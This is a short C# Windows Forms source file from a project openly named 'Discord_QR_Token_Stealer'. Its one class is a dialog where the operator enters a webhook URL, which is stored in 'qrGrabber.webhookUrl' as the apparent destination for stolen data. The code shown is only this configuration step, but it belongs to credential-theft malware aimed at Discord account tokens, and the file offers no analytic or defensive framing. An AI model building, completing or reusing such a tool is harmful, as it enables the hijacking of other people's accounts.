using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Discord_QR_Token_Stealer
{
    public partial class setHook : Form
    {
        public setHook()
        {
            InitializeComponent();
        }

        private void set_Click(object sender, EventArgs e)
        {
            // set the url and close
            qrGrabber.webhookUrl = hook.Text;
            Close();
        }
    }
}
